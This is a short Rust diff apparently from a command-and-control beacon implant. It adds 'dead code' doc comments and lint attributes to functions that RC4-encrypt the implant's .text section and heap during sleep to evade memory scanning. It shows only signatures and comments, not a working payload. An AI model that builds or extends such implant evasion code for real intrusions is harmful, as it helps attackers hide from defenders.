@@ -238,10 +238,20 @@ pub fn enumerate_beacon_heap_regions() -> alloc::vec::Vec<(*mut u8, usize)> {
 /// sleep). The caller supplies the raw NtProtectVirtualMemory for .text and
 /// the RC4 key.
 ///
+/// # Status: dead code — pending wiring
+///
+/// Zero callers. Originally wired into the now-deprecated `sleep::sleep()`
+/// Foliage APC path; with the beacon loop routing through
+/// `fluctuation::sleep` (which uses `mask_heap_regions`/`unmask_heap_regions`
+/// instead, NOT this combined text+heap variant), this entry point is
+/// dormant. Kept to be revived when the full Fluctuation sleep-obfuscation
+/// chain reintroduces `.text` masking via a helper thread. Do NOT delete.
+///
 /// # Safety
 /// Caller MUST guarantee the beacon thread is NOT executing (it's sleeping
 /// via alertable NtWaitForSingleObject). The .text flip + RC4 + heap RC4 all
 /// happen in this window.
+#[allow(dead_code)]
 pub unsafe fn mask_text_and_heap(
     text_base: usize,
     text_len: usize,
@@ -263,7 +273,14 @@ pub unsafe fn mask_text_and_heap(
     }
 }
 
-/// Unmask heap + registered regions + text (inverse of mask_text_and_heap).
+/// Unmask heap + registered regions + text (inverse of [`mask_text_and_heap`]).
+///
+/// # Status: dead code — pending wiring
+///
+/// Zero callers. Dies alongside `mask_text_and_heap` (see its doc comment).
+/// Will be revived when the Fluctuation sleep-obfuscation chain reintroduces
+/// `.text` masking. Do NOT delete.
+#[allow(dead_code)]
 pub unsafe fn unmask_text_and_heap(
     text_base: usize,
     text_len: usize,
